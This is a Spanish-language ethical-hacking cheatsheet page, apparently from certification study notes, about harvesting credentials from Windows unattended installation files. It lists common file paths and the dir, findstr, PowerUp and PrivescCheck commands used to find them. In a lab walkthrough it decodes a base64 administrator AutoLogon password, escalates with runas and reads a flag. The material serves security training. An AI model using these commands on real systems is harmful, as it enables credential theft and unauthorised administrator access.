
# Unnatended Installation Files

## <mark style="color:purple;">Introducción</mark>

Los archivos de instalación desatendida son una fuente común de credenciales y configuraciones sensibles en sistemas Windows, ya que a menudo contienen contraseñas de administrador, claves de producto y configuraciones de dominio.

#### ¿Qué son los Archivos de Instalación Desatendida?

Son archivos de configuración utilizados para automatizar la instalación de Windows, conteniendo:

* **Contraseñas de administrador local**
* **Credenciales de dominio**
* **Claves de producto de Windows**
* **Configuraciones de red**
* **Cuentas de usuario**

### Métodos Manuales de Búsqueda

#### **1. Ubicaciones Comunes de Archivos**

```powershell
# Archivos de instalación desatendida comunes
C:\Windows\Panther\unattend.xml
C:\Windows\Panther\autounattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\Panther\unattend.xml
C:\ProgramData\Microsoft\Windows\unattend.xml
C:\unattend.xml
C:\autounattend.xml

# Archivos de configuración de Sysprep
C:\Windows\System32\Sysprep\Sysprep.xml
C:\Windows\System32\Sysprep\Unattend.xml

# Archivos de respuesta de instalación
C:\Windows\Panther\Unattend\unattend.xml
C:\Windows\Panther\Unattend.xml
```

#### **2. Búsqueda con Comandos Básicos**

```powershell
# Usando dir en CMD
dir /s /b C:\*unattend*.xml
dir /s /b C:\*sysprep*.xml
dir /s /b C:\*autounattend*.xml

# Usando findstr para buscar contraseñas en archivos XML
findstr /s /i "password" C:\*.xml
findstr /s /i "administrator" C:\*.xml
findstr /s /i "autologon" C:\*.xml

# Usando PowerShell
Get-ChildItem -Path C:\ -Recurse -Include *unattend*.xml,*autounattend*.xml -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Recurse -Include *.xml -ErrorAction SilentlyContinue | Select-String "password"
```

#### 3. **Uso de PowerUp para Encontrar Archivos**

```powershell
# Cargar PowerUp
Import-Module .\PowerUp.ps1

# Buscar archivos de instalación desatendida
Get-UnattendedInstallFile

# Buscar archivos interesantes en general
Find-InterestingFile -Path C:\ -Include *.xml,*.config,*.txt,*.ini

# Buscar específicamente credenciales en archivos
Invoke-AllChecks | Select-String "unattend|password|credential"
```

#### 4. **Uso de PrivescCheck**

```powershell
# Cargar PrivescCheck
Import-Module .\PrivescCheck.ps1

# Buscar archivos de instalación desatendida
Invoke-PrivescCheck -CheckUnattendedFiles

# Búsqueda general de credenciales
Invoke-PrivescCheck -CheckCredentialFiles

# Buscar autologon en archivos
Invoke-PrivescCheck -CheckAutoLogon
```

***

## <mark style="color:purple;">Lab: Privesc Check</mark>

Este laboratorio cubre el uso del script [PrivescCheck.ps1](https://github.com/itm4n/PrivescCheck) para encontrar una vulnerabilidad común de escalada de privilegios en Windows.

#### Lab

En este laboratorio podemos alternar fácilmente entre la máquina Kali y la máquina Windows objetivo y tenemos todos los scripts disponibles en el escritorio de la máquina Windows:

<figure><img src="/files/tVlf9j9GOVAbR4YcYCSj" alt=""><figcaption></figcaption></figure>

### Búsqueda manual

Desde una CMD:

```powershell
C:\Users\student> dir /s /b C:\*unattend*.xml

C:\ProgramData\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml
C:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml
C:\Windows\Panther\unattend.xml
C:\Windows\System32\WdsUnattendTemplate.xml
```

### Con Power Up

```powershell
PS C:\Users\student\Desktop\PowerSploit\Privesc> powershell -ep bypass
PS C:\Users\student\Desktop\PowerSploit\Privesc> Import-Module .\PowerUp.ps1
PS C:\Users\student\Desktop\PowerSploit\Privesc> Get-UnattendedInstallFile

UnattendPath                    Name
------------                    ----
C:\Windows\Panther\Unattend.xml C:\Windows\Panther\Unattend.xml
```

O con el siguiente comando:

```powershell
PS C:\Users\student\Desktop\PowerSploit> Invoke-PrivescAudit

ModifiablePath    : C:\Users\student\AppData\Local\Microsoft\WindowsApps
IdentityReference : PRIV-ESC\student
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\student\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\student\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\student\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files
```

### Archivo Unattend

```xml
C:\Users\student> type C:\Windows\Panther\unattend.xml

<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="windowsPE">
        <component name="Microsoft-Windows-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <UserData>
                <ProductKey>
                    <WillShowUI>Always</WillShowUI>
                </ProductKey>
            </UserData>
            <UpgradeData>
                <Upgrade>true</Upgrade>
                <WillShowUI>Always</WillShowUI>
            </UpgradeData>
        </component>
<---SNIP--->
            <AutoLogon>
                <Password>
                    <Value>QWRtaW5AMTIz</Value>
                    <PlainText>false</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <Username>administrator</Username>
            </AutoLogon>
        </component>
    </settings>
</unattend>
```

Obtenemos la contraseña en plano de un administrador, pero está en base64.

### Decodificar base64

Desde Kali Linux lo podemos hacer fácilmente:

```bash
┌──(root㉿attackdefense)-[~]
└─# echo "QWRtaW5AMTIz" | base64 -d
Admin@123
```

### Runas como admin

```powershell
runas.exe /user:administrator cmd
Admin@123
```

<figure><img src="/files/raVNnNE1XGPHd4N0V6n8" alt=""><figcaption></figcaption></figure>

### Acceso a la flag

```powershell
C:\Windows\system32>cd C:/Users/Administrator/Desktop

C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of C:\Users\Administrator\Desktop

11/07/2020  07:03 AM    <DIR>          .
11/07/2020  07:03 AM    <DIR>          ..
11/07/2020  07:03 AM                32 flag.txt
               1 File(s)             32 bytes
               2 Dir(s)  15,716,675,584 bytes free

C:\Users\Administrator\Desktop>type flag.txt
097ab83639dce0ab3429cb03********
```

### Acceso desde Kali

Podemos usar las misma técnicas que en la sección anterior para acceder al equipo Windows desde Kali Linux usando `impacket-psexec` o el `HTA Server` de Metasploit.

{% content-ref url="/pages/gHaF6vUed8SWp2pWQHGA#explotacion-desde-kali-hta-server" %}
[Windows Privilege Escalation Scripts](/ethical-hacking-cheatsheet/introduccion/certificaciones/ecpptv3/privilege-escalation/windows-privilege-escalation/windows-privilege-escalation-scripts.md#explotacion-desde-kali-hta-server)
{% endcontent-ref %}
